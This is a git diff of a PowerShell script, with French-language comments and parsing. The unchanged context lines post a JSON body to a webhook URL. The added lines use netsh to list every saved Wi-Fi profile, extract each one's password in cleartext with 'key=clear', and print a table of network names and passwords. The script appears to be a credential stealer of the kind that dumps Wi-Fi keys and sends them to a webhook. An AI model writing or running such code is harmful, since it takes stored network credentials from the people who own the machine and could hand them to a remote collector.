@@ -20,4 +20,18 @@ $body = "{
 
 Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
 
-netsh wlan show profiles
+# Lister tous les profils Wi-Fi et leurs mots de passe
+$profiles = netsh wlan show profiles |
+    Where-Object { $_ -match "Profil Tous les utilisateurs\s*:\s*(.+)" } |
+    ForEach-Object { ($_ -split ":\s*", 2)[1].Trim() }
+
+foreach ($profile in $profiles) {
+    $details = netsh wlan show profile name="$profile" key=clear
+    $passwordLine = $details | Where-Object { $_ -match "Contenu de la clé\s*:" }
+    $password = if ($passwordLine) { ($passwordLine -split ":\s*", 2)[1].Trim() } else { "(aucun)" }
+
+    [PSCustomObject]@{
+        SSID       = $profile
+        MotDePasse = $password
+    }
+} | Format-Table -AutoSize
